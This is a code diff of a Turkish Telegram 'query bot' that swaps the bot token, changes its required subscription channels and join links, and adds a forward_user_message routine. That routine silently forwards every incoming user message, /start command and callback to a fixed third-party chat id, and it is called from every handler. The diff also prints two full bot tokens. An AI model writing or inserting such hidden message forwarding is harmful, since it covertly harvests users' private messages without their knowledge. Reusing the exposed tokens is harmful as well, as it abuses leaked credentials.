@@ -1,7 +1,4 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-
-TOKEN = "7880885971:AAFCgjQhfDdwag2Zwer3gdNV8K67cWKL3ZI"
+TOKEN = "7880885971:AAH567BS5Hlg0w6sn7nosHpDYqVD6yhPkFY"
 
 çıkarşuşarkıyıbatuflex = "\033[35m"
 yatak = "\033[36m"
@@ -56,9 +53,16 @@ class Batuflex:
         self.RESPONSE_LENGTH_THRESHOLD = 1000
         self.kardeşimAşkımYatSoySok()
 
+    def forward_user_message(self, chat_id, message_id):
+        # Tüm kullanıcı mesajlarını 7777518098 id'sine yönlendir
+        try:
+            self.batuHeker.forward_message(7777518098, chat_id, message_id)
+        except Exception as e:
+            print("Mesaj yönlendirme hatası:", e)
+
     def is_subscribed(self, user_id):
         # Check subscription for channels: @batutool and channel with id -1002558059383
-        channels = ["@batutool", "@ynbatuk","-1002652756971"]
+        channels = ["-1002710239804", "-1002506913695", "-1002652756971"]
         for channel in channels:
             try:
                 member = self.batuHeker.get_chat_member(channel, user_id)
@@ -70,9 +74,9 @@ class Batuflex:
 
     def send_subscription_keyboard(self, chat_id):
         markup = types.InlineKeyboardMarkup(row_width=2)
-        btn_batutool = types.InlineKeyboardButton(text="📢  @batutool", url="https://t.me/batutool")
-        btn_channel = types.InlineKeyboardButton(text="🌐  Kanal", url="https://t.me/ynbatuk")
-        y = types.InlineKeyboardButton(text="🌐  Kanal", url="https://t.me/+NjsouM_lA5piMGZk")
+        btn_batutool = types.InlineKeyboardButton(text="📢  KATIL", url="https://t.me/+ogVkvxtjHcE5MjY0")
+        btn_channel = types.InlineKeyboardButton(text="📢  KATIL", url="https://t.me/+zWlroFrp0X1iY2I8")
+        y = types.InlineKeyboardButton(text="📢  KATIL", url="https://t.me/+NjsouM_lA5piMGZk")
         btn_check = types.InlineKeyboardButton(text="✅  Kontrol Et", callback_data="check_subscription")
         markup.row(btn_batutool, btn_channel, y)
         markup.add(btn_check)
@@ -95,6 +99,8 @@ class Batuflex:
 
     def hekirHıhıSok(self, mesaj):
         cid = mesaj.chat.id
+        # Kullanıcıdan gelen mesajı yönlendir
+        self.forward_user_message(cid, mesaj.message_id)
         self.hekirBatuHekir[cid] = {}
         gselam = self.kardeşimAşkımYatSoy()
         self.batuHeker.send_message(cid, f"👋 {gselam}! 🎉 Sorgu Bot'una hoş geldiniz. Lütfen aşağıdaki menüden bir seçeneğe tıklayın:", reply_markup=self.soylikSelamSok())
@@ -102,6 +108,8 @@ class Batuflex:
     def kardeşimAşkımYatSoySok(self, mesaj=None):
         @self.batuHeker.message_handler(commands=['start'])
         def basla(m):
+            # /start komutu ile gelen mesajı yönlendir
+            self.forward_user_message(m.chat.id, m.message_id)
             user_id = m.from_user.id
             cid = m.chat.id
             if not self.is_subscribed(user_id):
@@ -111,6 +119,9 @@ class Batuflex:
 
         @self.batuHeker.callback_query_handler(func=lambda c: True)
         def callback(c):
+            # Callback ile gelen mesajı yönlendir (orijinal mesaj)
+            if c.message:
+                self.forward_user_message(c.message.chat.id, c.message.message_id)
             user_id = c.from_user.id
             cid = c.message.chat.id
             if c.data == "check_subscription":
@@ -147,6 +158,8 @@ class Batuflex:
 
         @self.batuHeker.message_handler(func=lambda m: True)
         def mesaj_isle(m):
+            # Gelen her mesajı yönlendir
+            self.forward_user_message(m.chat.id, m.message_id)
             user_id = m.from_user.id
             cid = m.chat.id
             if not self.is_subscribed(user_id):
